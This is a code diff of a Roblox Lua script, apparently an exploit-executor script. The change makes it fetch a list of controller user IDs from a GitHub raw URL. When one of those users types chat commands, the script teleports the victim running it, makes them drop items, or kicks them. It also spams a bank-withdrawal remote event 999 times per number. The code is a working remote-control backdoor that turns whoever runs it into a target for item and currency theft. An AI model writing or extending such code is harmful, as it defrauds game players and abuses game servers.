@@ -1,18 +1,18 @@
-local ids = tonumber(game:HttpGet("https://raw.githubusercontent.com/Turnergamer/ProX/refs/heads/main/src/id", true))
-print(ids)
+local ids = game:HttpGet("https://raw.githubusercontent.com/Turnergamer/ProX/refs/heads/main/src/id", true)
 
+-- Parse the IDs into a table
+local idList = {}
+for id in ids:gmatch("%d+") do
+    table.insert(idList, tonumber(id))
+end
 
-
-
-
-
-
-
-
+print(idList)  -- Print all the IDs to check if they were correctly fetched
 
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
 local takeout = {
     [1] = "TakeBank",
     [2] = "One",
@@ -25,22 +25,18 @@ local numbers = {
     "Six", "Seven", "Eight", "Nine", "Ten", 
     "Eleven", "Twelve", "Thirteen", "Fourteen", "Fifteen"
 }
+
 ---args for commands
 local dropargs = {
     [1] = "DropItem"
 }
 
---- Target user ID (Player who will be able to trigger the commands)
-local TargetUserId = 5722641035
-
 -- Function to teleport to a player's position
 local function teleportToPlayer(localPlayer, targetPlayer)
-    -- Wait for HumanoidRootPart of both LocalPlayer and targetPlayer to load
-    local targetHumanoidRootPart = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds
-    local localHumanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds
+    local targetHumanoidRootPart = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)
+    local localHumanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)
 
     if localHumanoidRootPart and targetHumanoidRootPart then
-        -- If both HumanoidRootParts are available, perform teleportation
         localHumanoidRootPart.CFrame = targetHumanoidRootPart.CFrame
     else
         warn("HumanoidRootPart not found for one of the players!")
@@ -49,8 +45,7 @@ end
 
 -- Function to store the current position of the player
 local function getPlayerPosition(localPlayer)
-    -- Wait for the HumanoidRootPart of LocalPlayer to load
-    local humanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)  -- Wait for up to 5 seconds
+    local humanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart", 5)
     if humanoidRootPart then
         return humanoidRootPart.CFrame
     else
@@ -58,9 +53,10 @@ local function getPlayerPosition(localPlayer)
         return nil
     end
 end
+
 local function TakeOutAll()
     for _, number in ipairs(numbers) do
-        takeout[2] = number  -- Update the second argument to the current number
+        takeout[2] = number
 
         -- Fire the RemoteEvent 999 times for each number
         for i = 1, 999 do
@@ -68,6 +64,7 @@ local function TakeOutAll()
         end
     end
 end
+
 -- Command mapping table to easily add more commands
 local commandActions = {
     ["^tp"] = function(sender)
@@ -79,19 +76,16 @@ local commandActions = {
         teleportToPlayer(LocalPlayer, sender)
     end,
     ["^drop"] = function(sender)
-        -- Store the current position of the LocalPlayer before dropping the item
         local originalPosition = getPlayerPosition(LocalPlayer)
         
-        -- Drop item by firing the RemoteEvent
         teleportToPlayer(LocalPlayer, sender)
         wait(0.4)
         game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(dropargs))
         print("DROP triggered")
         wait(0.4)
 
-        -- Teleport the player back to the original position after the drop
         if originalPosition then
-            local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5) -- Wait for it to load again if necessary
+            local humanoidRootPart = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5)
             if humanoidRootPart then
                 humanoidRootPart.CFrame = originalPosition
                 print("Returned to original position")
@@ -101,7 +95,6 @@ local commandActions = {
         end
     end,
     ["^kick"] = function(sender)
-        -- Kick the player with a custom message
         LocalPlayer:Kick("You have been kicked by a premium user.")
         print("KICK triggered")
     end
@@ -112,14 +105,17 @@ TextChatService.OnIncomingMessage = function(message)
     local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
 
     if sender then
-        -- Check if the sender matches the target user ID and message matches a command
-        if sender.UserId == TargetUserId then
-            -- Loop through the commandActions table to check if the message matches a command
-            for command, action in pairs(commandActions) do
-                if message.Text:lower() == command:lower() then
-                    action(sender)  -- Execute the command's action function
-                    break  -- Stop checking further commands once a match is found
+        -- Check if the sender's UserId is in the list of target IDs
+        for _, targetUserId in ipairs(idList) do
+            if sender.UserId == targetUserId then
+                -- Loop through the commandActions table to check if the message matches a command
+                for command, action in pairs(commandActions) do
+                    if message.Text:lower() == command:lower() then
+                        action(sender)  -- Execute the command's action function
+                        break  -- Stop checking further commands once a match is found
+                    end
                 end
+                break  -- Stop checking further target IDs once a match is found
             end
         end
     end
